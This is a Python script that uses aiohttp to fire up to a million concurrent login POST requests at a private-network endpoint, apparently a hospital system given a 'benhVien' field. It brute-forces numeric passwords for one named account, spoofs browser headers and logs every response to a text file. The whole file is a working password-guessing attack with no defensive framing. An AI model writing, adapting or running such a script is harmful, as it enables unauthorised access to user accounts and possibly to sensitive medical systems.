import asyncio
import aiohttp



async def post_data(session, url, data):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/json;charset=utf-8',
        'Origin': 'http://192.168.15.50',
        'Connection': 'keep-alive',
        'Referer': 'http://192.168.15.50/',
    }
    async with session.post(url, headers=headers, json=data) as response:
        return await response.text(),data

async def post_all():
    urls = [
        'http://192.168.15.60/api/v1/auth/login'
        # ...Thêm các URL khác nếu cần thiết
    ]
    tasks = []
    async with aiohttp.ClientSession() as session:
        for i in range(1, 1000000):
            data = {
                    'email': 'hiepdm_kt',
                    'password': f'{i}',
                    'forgot-password': True,
                    'benhVien': 2,
                }
            for url in urls:
                task = asyncio.ensure_future(post_data(session, url, data))
                tasks.append(task)
                
        responses = await asyncio.gather(*tasks)
        return responses

async def main():
    responses = await post_all()
    for i in responses:
        with open('dct_pas.txt','a') as f:
            f.write(i)
            f.write('\n')

loop = asyncio.get_event_loop()
loop.run_until_complete(main())
